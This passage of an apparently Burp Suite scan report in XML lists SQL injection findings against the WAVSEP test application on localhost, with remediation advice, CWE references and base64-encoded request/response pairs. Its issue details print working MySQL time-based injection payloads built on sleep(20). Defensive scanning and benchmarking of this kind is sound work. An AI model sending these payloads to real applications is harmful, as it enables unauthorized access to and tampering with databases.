      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMxDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGEgbG9naW4gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICd0ZXh0dmFsdWUyJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZScnJnBhc3N3b3JkPXRleHR2YWx1ZTIgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGEgbG9naW4gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKbG9naW4gZmFpbGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmInJnBhc3N3b3JkPXRleHR2YWx1ZTIgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjA1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGEgbG9naW4gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKbG9naW4gZmFpbGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8865408162214441984</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxTeW50YXhFcnJvckV4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJScnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4302279715597321216</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGV